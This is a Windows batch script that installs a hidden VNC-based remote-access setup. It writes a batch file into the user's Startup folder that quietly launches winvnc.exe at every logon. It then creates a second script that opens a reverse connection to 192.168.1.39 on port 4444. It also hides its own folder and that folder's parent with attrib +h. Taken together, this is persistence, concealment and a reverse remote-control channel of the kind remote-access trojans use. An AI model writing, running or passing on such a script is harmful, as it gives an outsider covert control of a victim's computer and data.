@echo off

REM Determine the directory where this batch file is located
set script_dir=%~dp0

REM Create the batch file for startup folder (startup_winvnc.bat)
(
  echo @echo off
  echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
  echo cd /d "%script_dir%"
  REM Start winvnc.exe in the background without showing console
  echo start /min "" winvnc.exe -run
  REM Wait for winvnc.exe to have permissions (check every 2 seconds)
  echo :CheckPermissions
  echo echo Checking permissions for winvnc.exe...
  echo REM Wait for winvnc.exe to have permissions (check every 2 seconds)
  echo :loop
  echo timeout /t 2 >nul
  echo tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
  echo if errorlevel 1 (
  echo   goto loop
  echo ) else (
  echo   echo winvnc.exe has permissions. Starting run_winvnc.bat...
  echo   call "%script_dir%run_winvnc.bat"
  echo )
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"

REM Create the batch file to run winvnc.exe (run_winvnc.bat)
(
  echo @echo off
  echo start winvnc.exe -run
  echo timeout /t 1 >nul
  echo winvnc.exe -connect 192.168.1.39::4444
) > "%script_dir%run_winvnc.bat"

REM Check if both batch files exist in their respective locations
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat" (
  echo startup_winvnc.bat created successfully in Startup folder.
) else (
  echo Failed to create startup_winvnc.bat in Startup folder.
)

if exist "%script_dir%run_winvnc.bat" (
  echo run_winvnc.bat created successfully in current directory.
) else (
  echo Failed to create run_winvnc.bat in current directory.
)

REM Hide the extracted Client-load folder and its parent folder
attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

REM Display a completion message
echo.
echo Startup setup completed. Parent folders hidden.

REM End of main.bat
